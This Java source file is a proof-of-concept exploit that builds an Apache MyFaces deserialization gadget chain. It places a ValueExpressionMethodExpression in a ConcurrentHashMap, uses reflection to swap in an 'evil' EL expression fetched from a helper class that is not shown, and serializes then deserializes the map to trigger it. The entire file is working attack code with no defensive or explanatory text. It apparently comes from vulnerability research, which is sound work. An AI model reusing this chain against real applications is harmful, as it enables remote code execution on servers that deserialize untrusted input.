package com.example.Myface;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression;

import javax.el.ValueExpression;
import java.util.concurrent.ConcurrentHashMap;

public class POC_3 {

    public static void main(String[] args) throws Exception {
        ValueExpression normal = Share.getValueExpression();
        ValueExpression evil = Share.getEvilExpression();
        ValueExpressionMethodExpression expression = new ValueExpressionMethodExpression(normal);

        ConcurrentHashMap map = new ConcurrentHashMap<>();
        map.put(expression, "v1");
        map.put("k2", "v2");

        ReflectionUtil.setField(expression, "valueExpression", evil);
        SerializeUtil.deserialize(SerializeUtil.serialize(map));
    }

}
